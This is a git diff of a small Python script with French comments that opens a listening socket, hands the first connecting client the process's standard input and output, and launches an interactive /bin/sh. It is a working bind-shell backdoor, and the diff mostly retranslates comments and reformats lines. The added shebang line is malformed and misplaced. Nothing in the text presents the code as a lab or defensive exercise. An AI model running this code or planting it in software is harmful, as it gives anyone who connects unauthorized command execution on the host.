@@ -1,4 +1,5 @@
-# --*-- coding:UTF-8 --*--
+#-*- coding:UTF-8 -*
+#!/bin/usr/env python
 
 import os
 import socket
@@ -16,14 +17,18 @@ except socket.error as exeption:
     exit(0)
 
 s.listen(1)  # Attente 1 connection
-client, adresse = s.accept()  # Acceptatin de la connection
-print(adresse)  # Affichage de l'addresse du client
-welcomeMessage = "Bonjour\n"
-client.send(bytes(welcomeMessage, encoding='utf8'))  # Envoie du message de bienvenue
+client, address = s.accept()  # Acceptation de la connection
+print(address)
+
+# Envoie du message de bienvenue
+welcomeMessage = "Hello\n"
+client.send(bytes(welcomeMessage, encoding='utf8'))
 
 for f in range(3):  # Redirection des entrées sorties stdin, stdout, stderr
     os.dup2(client.fileno(), f)
 
-p = subprocess.call(["/bin/sh", "-i"])  # Ouverture du shell sh en mode interractif
+# Ouverture d'un shell en mode interactif
+p = subprocess.call(["/bin/sh", "-i"])
 
-s.close()  # Fermeture du socket après avoir quitter le shell
+# Fermeture du socket après avoir quitter le shell
+s.close()
